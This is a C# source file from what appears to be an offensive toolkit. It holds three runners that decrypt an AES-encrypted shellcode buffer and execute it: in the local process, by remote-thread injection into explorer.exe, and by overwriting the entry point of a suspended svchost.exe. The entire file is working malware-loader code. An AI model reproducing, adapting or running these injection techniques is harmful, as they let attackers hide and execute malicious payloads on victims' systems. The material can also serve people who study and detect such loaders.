using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using static NetRunners.Decryptors.Decryptors;
using static NetRunners.Data.Delegates;
using static NetRunners.Data.Structures;
using static NetRunners.Data.Encrypted;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains various shellcode runners.
    /// Retrieves encrypted payload from Shellcode class.
    /// Retrieves win32 apis from Win32APIs class, retrieves needed structures from Structures class.
    /// </summary>
    class Runners
    {
        static byte[] buf = NetRunners.Data.Encrypted.buf;

        // Basic Reflective Runner
        public static void Run()
        {
            try
            {
                // try to decrypt buf
                try
                {
                    buf = DecryptBytesToBytes_Aes(buf, AesKey, AesIV);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }
                int sBuf = buf.Length;

                // call virtual alloc to allocate memory space here
                IntPtr pMemory = VirtualAlloc(IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_READWRITE);
                if (pMemory == IntPtr.Zero)
                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()} ");

                // copy shellcode to allocated memory
                Marshal.Copy(buf, 0, pMemory, sBuf);

                // change memory protection
                uint oldProtect;

                bool bVP = VirtualProtect(pMemory, (UIntPtr)sBuf, PAGE_READWRITE, out oldProtect);
                if (!bVP)
                {
                    throw new InvalidOperationException($"VirtualProtect failed with error code: {Marshal.GetLastWin32Error()}");
                }

                // execute shellcode
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, pMemory, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                    throw new InvalidOperationException($"CreateThread failed with error code: {Marshal.GetLastWin32Error()} ");

                // call wait function
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception e)
            {
                // handle error
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }

        // Process Injection Runner
        public static void piRun()
        {
            try
            {
                // get explorer pid
                Process[] explorerProcesses = Process.GetProcessesByName("explorer");
                int explorerPID = explorerProcesses[0].Id;
                if (explorerPID == 0)
                    throw new Exception($"Failed retrieving explorer's PID");


                // open handle to target process 
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerPID);
                if (hProcess == IntPtr.Zero)
                    throw new InvalidOperationException($"OpenProcess failed with error code: {Marshal.GetLastWin32Error()}");

                //decrypt buf
                try
                {
                    buf = DecryptBytesToBytes_Aes(buf, AesKey, AesIV);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }
                int sBuf = buf.Length;

                // allocate memory on remote process
                IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_EXECUTE_READ);
                if (pRMemory == IntPtr.Zero)
                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()}");

                // write to remote process memory
                IntPtr outSize;
                WriteProcessMemory(hProcess, pRMemory, buf, buf.Length, out outSize);
                if (outSize == IntPtr.Zero)
                    throw new InvalidOperationException($"WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");

                // create remote thread to execute shellcode
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                    throw new InvalidOperationException($"WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
            }
            catch (Exception e)
            {
                // handle error
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }

        // EntryPoint Stomping Runner (Special Thanks 2 cpu0x00!)
        public static void epsRun()
        {
            try
            {
                // instantiate structs
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

                // create suspended svchost process
                bool res = CreateProcessA(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
                if (res == false)
                    throw new InvalidOperationException($"CreateProcessA failed with error code: {Marshal.GetLastWin32Error()}");

                // fetch PEB address using zwqueryinfo
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess;
                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                // fetch address of the code base
                byte[] addrBuf = new byte[IntPtr.Size];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                // parse PE header to locate entrypoint
                byte[] data = new byte[0x200];
                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
                uint opthdr = e_lfanew_offset + 0x28;
                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                //decrypt buf
                try
                {
                    buf = DecryptBytesToBytes_Aes(buf, AesKey, AesIV);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }
                int sBuf = buf.Length;

                // write shellcode to memory
                WriteProcessMemory(hProcess, addressOfEntryPoint, buf, sBuf, out nRead);

                // resume thread
                ResumeThread(pi.hThread);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error ocurred: {e.Message}");
                throw;
            }
        }
    }
}
